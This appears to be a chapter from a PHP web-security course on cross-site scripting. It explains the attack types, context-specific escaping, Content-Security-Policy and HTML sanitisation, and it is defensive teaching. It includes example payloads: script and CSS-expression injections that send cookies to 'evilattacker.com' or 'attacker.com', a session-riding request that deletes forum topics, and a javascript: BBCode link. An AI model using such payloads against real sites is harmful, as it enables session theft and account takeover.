Cross-Site Scripting (XSS)?

from: [https://stackskills.com/courses/614031]

Cross-Site Scripting (XSS) is probably the most common singular security vulnerability existing in web applications at large. It has been estimated that approximately 65% of websites are vulnerable to an XSS attack in some form, a statistic which should scare you as much as it does me.

What is Cross-Site Scripting?

XSS occurs when an attacker is capable of injecting a script, often Javascript, into the output of a web application in such a way that it is executed in the client browser. This ordinarily happens by locating a means of breaking out of a data context in HTML into a scripting context - usually by injecting new HTML, Javascript strings or CSS markup. HTML has no shortage of locations where executable Javascript can be injected and browsers have even managed to add more. The injection is sent to the web application via any means of input such as HTTP parameters.

One of the major underlying symptoms of Cross-Site Scripting’s prevelance, unique to such a serious class of security vulnerabilities, is that programmers continually underestimate its potential for damage and commonly implement defenses founded on misinformation and poor practices. This is particularly true of PHP where poor information has overshadowed all other attempts to educate programmers. In addition, because XSS examples in the wild are of the simple variety programmers are not beyond justifying a lack of defenses when it suits them. In this environment, it’s not hard to see why a 65% vulnerability rate exists.

If an attacker can inject Javascript into a web application’s output and have it executed, it allows the attacker to execute any conceivable Javascript in a user’s browser. This gives them complete control of the user experience. From the browser’s perspective, the script originated from the web application so it is automatically treated as a trusted resource.

Back in my Introduction, I noted that trusting any data not created explicitly by PHP in the current request should be considered untrusted. This sentiment extends to the browser which sits separately from your web application. The fact that the browser trusts everything it receives from the server is itself one of the root problems in Cross-Site Scripting. Fortunately, it’s a problem with an evolving solution which we’ll discuss later.

We can extend this even further to the Javascript environment a web application introduces within the browser. Client side Javascript can range from the very simple to the extremely complex, often becoming client side applications in their own right. These client side applications must be secured like any application, distrusting data received from remote sources (including the server-hosted web application itself), applying input validation, and ensuring output to the DOM is correctly escaped or sanitised.

Injected Javascript can be used to accomplish quite a lot: stealing cookie and session information, performing HTTP requests with the user’s session, redirecting users to hostile websites, accessing and manipulating client-side persistent storage, performing complex calculations and returning results to an attacker’s server, attacking the browser or installing malware, leveraging control of the user interface via the DOM to perform a UI Redress (aka Clickjacking) attack, rewriting or manipulating in-browser applications, attacking browser extensions, and the list goes on...possibly forever.

UI Redress (also Clickjacking)

While a distinct attack in its own right, UI Redress is tightly linked with Cross-Site Scripting since both leverage similar sets of vectors. Sometimes it can be very hard to differentiate the two because each can assist in being successful with the other.

A UI Redress attack is any attempt by an attacker to alter the User Interface of a web application. Changing the UI that a user interacts with can allow an attacker to inject new links, new HTML sections, to resize/hide/overlay interface elements, and so on. When such attacks are intended to trick a user into clicking on an injected button or link it is usually referred to as Clickjacking.



While much of this chapter applies to UI Redress attacks performed via XSS, there are other methods of performing a UI Redress attack which use frames instead.

A Cross-Site Scripting Example

Let’s imagine that an attacker has stumbled across a custom built forum which allows users to display a small signature beneath their comments. Investigating this further, the attacker sets up an account, spams all topics in reach.

<script>document.write('<iframe src="http://evilattacker.com?cookie=' + document.cookie.escape() + '" height=0 width=0 />');</script>



By some miracle, the forum software includes this signature as-is in all those spammed topics for all the forum users to load into their browsers. The results should be obvious from the Javascript code. The attacker is injecting an iframe into the page which will appear as a teeny tiny dot (zero sized) at the very bottom of the page attracting no notice from anyone. The browser will send the request for the iframe content which passes each user’s cookie value as a GET parameter to the attacker’s URI where they can be collated and used in further attacks. While typical users aren’t that much of a target for an attacker, a well designed trolling topic will no doubt attract a moderator or administrator whose cookie may be very valuable in gaining access to the forums moderation functions.



This is a simple example but feel free to extend it. Perhaps the attacker would like to know the username associated with this cookie? Easy! Add more Javascript to query the DOM and grab it from the current web page to include in a “username=” GET parameter to the attacker’s URL. Perhaps they also need information about your browser to handle a Fingerprint defense of the session too? Just include the value from “navigator.userAgent”.



This simple attack has a lot of repercussions including potentially gaining control over the forum as an administrator. It’s for this reason that underestimating the potential of XSS attack is ill advised.



Of course, being a simple example, there is one flaw with the attacker’s approach. Similar to examples using Javascript’s alert() function I’ve presented something which has an obvious defense. All cookies containing sensitive data should be tagged with the HttpOnly flag which prevents Javascript from accessing the cookie data. The principle you should remember, however, is that if the attacker can inject Javascript, they can probably inject all conceivable Javascript. If they can’t access the cookie and mount an attack using it directly, they will do what all good programmers would do: write an efficient automated attack.

<script>

  var params = 'type=topic&action=delete&id=347';

  var http = new XMLHttpRequest();

  http.open('POST', 'forum.com/admin_control.php', true);

  http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

  http.setRequestHeader("Content-length", params.length);

  http.setRequestHeader("Connection", "close");

  http.onreadystatechange = function() {

    if(http.readyState == 4 && http.status == 200) {

      // Do something else.

    }

  };

  http.send(params);

</script>



The above is one possible use of Javascript to execute a POST request to delete a topic. We could encapsulate this in a check to only run for a moderator, i.e. if the user’s name is displayed somewhere we can match it against a list of known moderators or detect any special styling applied to a moderator’s displayed name in the absence of a known list.

As the above suggests, HttpOnly cookies are of limited use in defending against XSS. They block the logging of cookies by an attacker but do not actually prevent their use during an XSS attack. Furthermore, an attacker would prefer not to leave bread crumbs in the visible markup to arouse suspicion unless they actually want to be detected.

Next time you see an example using the Javascript alert() function, substitute it with a XMLHttpRequest object to avoid being underwhelmed.



Types of Cross-Site Scripting Attacks

XSS attacks can be categorised in two ways. The first lies in how malicious input navigates the web application. Input to an application can be included in the output of the current request, stored for inclusion in the output of a later request, or passed to a Javascript based DOM operation. This gives rise to the following categories:



Reflected XSS Attack

In a Reflected XSS attack, untrusted input sent to a web application is immediately included in the application’s output, i.e. it is reflected from the server back to the browser in the same request. Reflection can occur with error messages, search engine submissions, comment previews, etc. This form of attack can be mounted by persuading a user to click a link or submit a form of the attacker’s choosing. Getting a user to click untrusted links may require a bit of persuasion and involve emailing the target, mounting a UI Redress attack, or using a URL Shortener service to disguise the URL. Social services are particularly vulnerable to shortened URLs since they are commonplace in that setting. Be careful of what you click!



Stored XSS Attack

A Stored XSS attack is when the payload for the attack is stored somewhere and retrieved as users view the targeted data. While a database is to be expected, other persistent storage mechanisms can include caches and logs which also store information for long periods of time. We’ve already learned about Log Injection attacks.



DOM-based XSS Attack

DOM-based XSS can be either reflected or stored and the differentiation lies in how the attack is targeted. Most attacks will strike at the immediate markup of a HTML document. However, HTML may also be manipulated by Javascript using the DOM. An injected payload, rendered safely in HTML, might still be capable of interfering with DOM operations in Javascript. There may also be security vulnerabilities in Javascript libraries or their usage which can also be targeted.



Cross-Site Scripting And Injecting Context

An XSS attack is successful when it can inject Context. The term “Context” relates to how browsers interpret the content of a HTML document. Browsers recognise a number of key Contexts including: HTML Body, HTML Attribute, Javascript, URI and CSS.



The goal of an attacker is to take data destined for one of these Contexts and make browser interpret it as another Context. For example, consider the following:

<div style="background:<?php echo $colour ?>;">



In the above, $colour is populated from a database of user preferances which influence the background colour used for a block of text. The value is injected into a CSS Context which is a child of a HTML Attribute Context, i.e. we’re sticking some CSS into a style attribute. It may seem unimportant to get so hooked up on Context but consider this

$colour = "expression(document.write('<iframe src="

  .= "http://evilattacker.com?cookie=' + document.cookie.escape() + "

  .= "' height=0 width=0 />'))";

<div style="background:<?php echo $colour ?>;">





If an attacker can successfully inject that “colour”, they can inject a CSS expression which will execute the contained Javascript under Internet Explorer. In other words, the attacker was able to switch out of the current CSS Context by injecting a new Javascript Context.



Now, I was very careless with the above example because I know some readers will be desperate to get to the point of using escaping. So let’s do that now.

$colour = "expression(document.write('<iframe src="

  .= "http://evilattacker.com?cookie=' + document.cookie.escape() + "

  .= "' height=0 width=0 />'))";

<div style="background:<?php echo htmlspecialchars($colour, ENT_QUOTES, 'UTF-8') ?>;">





If you checked this with Internet Explorer, you’d quickly realise something is seriously wrong. After using htmlspecialchars() to escape $colour, the XSS attack is still working!



This is the importance of understanding Context correctly. Each Context requires a different method of escaping because each Context has different special characters and different escaping needs. You cannot just throw htmlspecialchars() and htmlentities() at everything and pray that your web application is safe.



What went wrong in the above is that the browser will always unesape HTML Attributes before interpreting the context. We ignored the fact there were TWO Contexts to escape for. The unescaped HTML Attribute data is the exact same CSS as the unescaped example would have rendered anyway.



What we should have done was CSS escaped the $colour variable and only then HTML escaped it. This would have ensured that the $colour value was converted into a properly escaped CSS literal string by escaping the brackets, quotes, spaces, and other characters which allowed the expression() to be injected. By not recognising that our attribute encompassed two Contexts, we escaped it as if it was only one: a HTML Attribute. A common mistake to make.



The lesson here is that Context matters. In an XSS attack, the attacker will always try to jump out of the current Context into another one where Javascript can be executed. If you can identify all the Contexts in your HTML output, bearing in mind their nestable nature, then you’re ten steps closer to successfully defending your web application from Cross-Site Scripting.



Let’s take another quick example:



<a href="http://www.example.com">Example.com</a>

Omitting untrusted input for the moment, the above can be dissected as follows:



1. There is a URL Context, i.e. the value of the href attribute.

2. There is a HTML Attribute Context, i.e. it parents the URL Context.

3. There is a HTML Body Context. i.e. the text between the <a> tags.

That’s three different Contexts implying that up to three different escaping strategies would be required if the data was determined by untrusted data. We’ll look at escaping as a defense against XSS in far more detail in the next section.





Defending Against Cross-Site Scripting Attacks

Defending against XSS is quite possible but it needs to be applied consistently while being intolerant of exceptions and shortcuts, preferably early in the web application’s development when the application’s workflow is fresh in everyone’s mind. Late implementation of defenses can be a costly affair.



Input Validation

Input Validation is any web application’s first line of defense. That said, Input Validation is limited to knowing what the immediate usage of an untrusted input is and cannot predict where that input will finally be used when included in output. Practically all free text falls into this category since we always need to allow for valid uses of quotes, angular brackets and other characters.



Therefore, validation works best by preventing XSS attacks on data which has inherent value limits. An integer, for example, should never contain HTML special characters. An option, such as a country name, should match a list of allowed countries which likewise will prevent XSS payloads from being injected.



Input Validation can also check data with clear syntax constraints. For example, a valid URL should start with http:// or https:// but not the far more dangerous javascript: or data: schemes. In fact, all URLs derived from untrusted input must be validated for this very reason. Escaping a javascript: or data: URI has the same effect as escaping a valid URL, i.e. nothing whatsoever.



While Input Validation won’t block all XSS payloads, it can help block the most obvious. We cover Input Validation in greater detail in Chapter 2.



Escaping (also Encoding)

Escaping data on output is a method of ensuring that the data cannot be misinterpreted by the currently running parser or interpreter. The obvious examples are the less-than and greater-than sign that denote element tags in HTML. If we allowed these to be inserted by untrusted input as-is, it would allow an attacker to introduce new tags that the browser would render. As a result, we normally escape these using the &gt; and $lt; HTML named entities.



As the replacement of such special characters suggests, the intent is to preserve the meaning of the data being escaped. Escaping simply replaces characters with special meaning to the interpreter with an alternative which is usually based on a hexadecimal representation of the character or a more readable representation, such as HTML named entities, where it is safe to do so.



As my earlier diversion into explaining Context mentioned, the method of escaping varies depending on which Content data is being injected into. HTML escaping is different from Javascript escaping which is also different from URL escaping. Applying the wrong escaping strategy to a Context can result in an escaping failure, opening a hole in a web applications defenses which an attacker may be able to take advantage of.



To facilitate Context-specific escaping, it’s recommended to use a class designed with this purpose in mind. PHP does not supply all the necessary escaping functionality out of the box and some of what it does offer is not as safe as popularly believed. You can find an Escaper class which I designed for the Zend Framework, which offers a more approachable solution, here.



Let’s examine the escaping rules applicable to the most common Contexts: HTML Body, HTML Attribute, Javascript, URL and CSS.



Never Inject Data Except In Allowed Locations

Before presenting escaping strategies, it’s essential to ensure that your web application’s templates do not misplace data. This rule refers to injecting data in sensitive areas of HTML which offer an attacker the opportunity to influence markup parsing and which do not ordinarily require escaping when used by a programmer. Consider the following examples where [...] is a data injection.

<script>...</script>

<!--...-->

<div ...="test"/>

<... href="http://www.example.com"/>

<style>...</style>



Each of the above locations are dangerous. Allowing data within script tags, outside of literal strings and numbers, would let an attack inject Javascript code. Data injected into HTML comments might be used to trigger Internet Explorer conditionals and other unanticipated results. The next two are more obvious as we would never want an attacker to be able to influence tag or attribute names - that’s what we’re trying to prevent! Finally, as with scripts, we can’t allow attackers to inject directly into CSS as they may be able to perform UI Redress attacks and Javascript scripting using the Internet Explorer supported expression() function.



Always HTML Escape Before Injecting Data Into The HTML Body Context

The HTML Body Context refers to textual content which is enclosed in tags, for example text included between <body>, <div>, or any other pairing of tags used to contain text. Data injected into this content must be HTML escaped.



HTML Escaping is well known in PHP since it’s implemented by the htmlspecialchars() function.



Always HTML Attribute Escape Before Injecting Data Into The HTML Attribute Context

The HTML Attribute Context refers to all values assigned to element attrbutes with the exception of attributes which are interpreted by the browser as CDATA. This exception is a little tricky but largely refers to non-XML HTML standards where Javascript can be included in event attributes unescaped. For all other attributes, however, you have the following two choices:



If the attribute value is quoted, you MAY use HTML Escaping; but

If the attribute is unquoted, you MUST use HTML Attribute Escaping.

The second option also applies where attribute quoting style may be in doubt. For example, it is perfectly valid in HTML5 to use unquoted attribute values and examples in the wild do exist. Ere on the side of caution where there is any doubt.



Always Javascript Escape Before Injecting Data Into Javascript Data Values

Javascript data values are basically strings. Since you can’t escape numbers, there is a sub-rule you can apply:



Always Validate Numbers...



Content-Security Policy

The root element in all our discussions about Cross-Site Scripting has been that the browser unquestionably executes all the Javascript it receives from the server whether it be inline or externally sourced. On receipt of a HTML document, the browser has no means of knowing which of the resources it contains are innocent and which are malicious. What if we could change that?



The Content-Security Policy (CSP) is a HTTP header which communicates a whitelist of trusted resource sources that the browser can trust. Any source not included in the whitelist can now be ignored by the browser since it’s untrusted. Consider the following:



X-Content-Security-Policy: script-src 'self'

This CSP header tells the browser to only trust Javascript source URLs pointing to the current domain. The browser will now grab scripts from this source but completely ignore all others. This means that http://attacker.com/naughty.js is not downloaded if injected by an attacker. It also means that all inline scripts, i.e. <script> tags, javascript: URIs or event attribute content are all ignored too since they are not in the whitelist.



If we need to use Javascript from another source besides ‘self’, we can extend the whitelist to include it. For example, let’s include jQuery’s CDN address.



X-Content-Security-Policy: script-src 'self' http://code.jquery.com

You can add other resource directives, e.g. style-src for CSS, by dividing each resource directive and its whitelisting with a semi-colon.



X-Content-Security-Policy: script-src 'self' http://code.jquery.com; style-src 'self'

The format of the header value is very simple. The value is constructed with a resource directive “script-src” followed by a space delimited list of sources to apply as a whitelist. The source can be a quoted keyword such as ‘self’ or a URL. The URL value is matched based on the information given. Information omitted in a URL can be freely altered in the HTML document. Therefore http://code.jquery.com prevents loading scripts from http://jquery.com or http://domainx.jquery.com because we were specific as to which subdomain to accept. If we wanted to allow all subdomains we could have specified just http://jquery.com. The same thinking applies to paths, ports, URL scheme, etc.



The nature of the CSP’s whitelisting is simple. If you create a whitelist of a particular type of resource, anything not on that whitelist is ignored. If you do not define a whitelist for a resource type, then the browser’s default behaviour kicks for that resource type.



Here’s a list of the resource directives supported:



connect-src: Limits the sources to which you can connect using XMLHttpRequest, WebSockets, etc. font-src: Limits the sources for web fonts. frame-src: Limits the source URLs that can be embedded on a page as frames. img-src: Limits the sources for images. media-src: Limits the sources for video and audio. object-src: Limits the sources for Flash and other plugins. script-src: Limits the sources for script files. style-src: Limits the sources for CSS files.



For maintaining secure defaults, there is also the special “default-src” directive that can be used to create a default whitelist for all of the above. For example:



X-Content-Security-Policy: default-src 'self'; script-src 'self' http://code.jquery.com

The above will limit the source for all resources to the current domain but add an exception for script-src to allow the jQuery CDN. This instantly shuts down all avenues for untrusted injected resources and allows is to carefully open up the gates to only those sources we want the browser to trust.



Besides URLs, the allowed sources can use the following keywords which must be encased with single quotes:



‘none’ ‘self’ ‘unsafe-inline’ ‘unsafe-eval’



You’ll notice the usage of the term “unsafe”. The best way of applying the CSP is to not duplicate an attacker’s practices. Attackers want to inject inline Javascript and other resources. If we avoid such inline practices, our web applications can tell browsers to ignore all such inlined resources without exception. We can do this using external script files and Javascript’s addEventListener() function instead of event attributes. Of course, what’s a rule without a few useful exceptions, right? Seriously, eliminate any exceptions. Setting ‘unsafe-inline’ as a whitelisting source just goes against the whole point of using a CSP.



The ‘none’ keyword means just that. If set as a resource source it just tells the browser to ignore all resources of that type. Your mileage may vary but I’d suggest doing something like this so your CSP whitelist is always restricted to what it allows:



X-Content-Security-Policy: default-src 'none'; script-src 'self' http://code.jquery.com; style-src 'self'

Just one final quirk to be aware of. Since the CSP is an emerging solution not yet out of draft, you’ll need to dumplicate the X-Content-Security-Policy header to ensure it’s also picked up by WebKit browsers like Safari and Chrome. I know, I know, that’s WebKit for you.



X-Content-Security-Policy: default-src 'none'; script-src 'self' http://code.jquery.com; style-src 'self'

X-WebKit-CSP: default-src 'none'; script-src 'self' http://code.jquery.com; style-src 'self'

Browser Detection

HTML Sanitisation

At some point, a web application will encounter a need to include externally determined HTML markup directly into a web page without escaping it. Obvious examples can include forum posts, blog comments, editing forms, and entries from an RSS or Atom feed. If we were to escape the resulting HTML markup from those sources, they would never render correctly so we instead need to carefully filter it to make sure that any and all dangerous markup is neutralised.



You’ll note that I used the phrase “externally determined” as opposed to externally generated. In place of accepting HTML markup, many web applications will allow users to instead use an alternative such as BBCode, Markdown, or Textile. A common fallacy in PHP is that these markup languages have a security function in preventing XSS. That is complete nonsense. The purpose of these languages is to allow users write formatted text more easily without dealing with HTML. Not all users are programmers and HTML is not exactly consistent or easy given its SGML roots. Writing long selections of formatted text in HTML is painful.



The act of generating HTML from such inputs (unless we received HTML to start with!) occurs on the server. That implies a trustworthy operation which is a common mistake to make. The HTML that results from such generators was still “determined” by an untrusted input. We can’t assume it’s safe. This is simply more obvious with a blog feed since its entries are already valid HTML.



Let’s take the following BBCode snippet:



[url=javascript:alert(‘I can haz Cookie?n’+document.cookie)]Free Bitcoins Here![/url]

BBCode does limit the allowed HTML by design but it doesn’t mandate, for example, using HTTP URLs and most generators won’t notice this creeping through.



As another example, take the following selection of Markdown:



I am a Markdown paragraph.<script>document.write(‘<iframe src=”http://attacker.com?cookie=‘ + document.cookie.escape() + ‘” height=0 width=0 />’);</script>



There’s no need to panic. I swear I am just plain text!



Markdown is a popular alternative to writing HTML but it also allows authors to mix HTML into Markdown. It’s a perfectly valid Markdown feature and a Markdown renderer won’t care whether there is an XSS payload included.



After driving home this point, the course of action needed is to HTML sanitise whatever we are going to include unescaped in web application output after all generation and other operations have been completed. No exceptions. It’s untrusted input until we’ve sanitised it outselves.



HTML Sanitisation is a laborious process of parsing the input HTML and applying a whitelist of allowed elements, attributes and other values. It’s not for the faint of heart, extremely easy to get wrong, and PHP suffers from a long line of insecure libraries which claim to do it properly. Do use a well established and reputable solution instead of writing one yourself.



The only library in PHP known to offer safe HTML Sanitisation is HTMLPurifier. It’s actively maintained, heavily peer reviewed and I strongly recommend it. Using HTMLPurifier is relatively simple once you have some idea of the HTML markup to allow:



// Basic setup without a cache

$config = HTMLPurifier_Config::createDefault();

$config->set('Core', 'Encoding', 'UTF-8');

$config->set('HTML', 'Doctype', 'HTML 4.01 Transitional');

// Create the whitelist

$config->set('HTML.Allowed', 'p,b,a[href],i'); // basic formatting and links

$sanitiser = new HTMLPurifier($config);

$output = $sanitiser->purify($untrustedHtml);